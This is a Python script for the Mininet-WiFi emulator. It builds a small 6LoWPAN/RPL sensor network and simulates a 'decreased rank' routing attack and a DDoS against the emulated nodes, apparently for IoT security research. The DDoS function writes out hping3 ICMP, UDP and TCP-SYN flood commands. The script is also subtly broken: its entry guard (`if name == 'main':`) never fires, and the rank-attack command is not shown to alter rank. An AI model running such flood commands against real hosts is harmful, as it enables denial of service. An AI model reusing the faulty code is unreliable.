#!/usr/bin/env python

import sys
from mininet.log import setLogLevel, info
from mn_wifi.sixLoWPAN.link import LoWPAN
from mn_wifi.cli import CLI
from mn_wifi.net import Mininet_wifi
from time import sleep
from random import choice
from datetime import datetime
from random import randrange

def topology():
    "Create a network."
    net = Mininet_wifi(iot_module='mac802154_hwsim')

    info("*** Creating nodes\n")
    sensor1 = net.addSensor('sensor1', ip6='fe80::1/64', panid='0xbeef', dodag_root=True, storing_mode=2)
    sensor2 = net.addSensor('sensor2', ip6='fe80::2/64', panid='0xbeef', storing_mode=2)
    sensor3 = net.addSensor('sensor3', ip6='fe80::3/64', panid='0xbeef', storing_mode=2)
    sensor4 = net.addSensor('sensor4', ip6='fe80::4/64', panid='0xbeef', storing_mode=2)

    info("*** Configuring nodes\n")
    net.configureNodes()

    info("*** Adding links\n")
    net.addLink(sensor1, sensor2, cls=LoWPAN)
    net.addLink(sensor1, sensor3, cls=LoWPAN)
    net.addLink(sensor3, sensor4, cls=LoWPAN)

    info("*** Starting network\n")
    net.build()

    if '-r' in sys.argv:
        info("*** Configuring RPLD\n")
        net.configRPLD(net.sensors)

    # Trigger the Decreased Rank Attack
    perform_decreased_rank_attack(net)

    # Trigger the DDoS Attack
    perform_ddos_attack(net)

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()

def perform_decreased_rank_attack(net):
    """Simulate a decreased rank attack."""
    attacker = net.get('sensor3')  # Node performing the attack
    info("*** Performing Decreased Rank Attack from sensor3\n")
    attacker.cmd('rpld -r fe80::3/64 -m 1')  # Command to manipulate the rank
    sleep(10)

def ip_generator():
    """Generates a random IP from the 6LoWPAN subnet."""
    ip = "fe80::{}".format(randrange(1, 5))  # Randomly generate IP between fe80::1 to fe80::4
    return ip

def perform_ddos_attack(net):
    """Simulate a DDoS attack using ICMP, UDP, and TCP-SYN floods."""
    info("*** Performing DDoS Attack\n")
    
    # Select attacker node (any random node)
    hosts = [net.get('sensor1'), net.get('sensor2'), net.get('sensor3'), net.get('sensor4')]
    src = choice(hosts)

    # ICMP Flood (Ping Flood)
    dst = ip_generator()
    info("Performing ICMP (Ping) Flood from {} to {}\n".format(src.name, dst))
    src.cmd("timeout 20s hping3 -1 -V -d 120 -w 64 -p 80 --flood {}".format(dst))
    sleep(5)

    # UDP Flood
    dst = ip_generator()
    info("Performing UDP Flood from {} to {}\n".format(src.name, dst))
    src.cmd("timeout 20s hping3 -2 -V -d 120 -w 64 --flood {}".format(dst))
    sleep(5)

    # TCP-SYN Flood
    dst = ip_generator()
    info("Performing TCP-SYN Flood from {} to {}\n".format(src.name, dst))
    src.cmd("timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --flood {}".format(dst))
    sleep(5)

if name == 'main':
    setLogLevel('info')
    topology()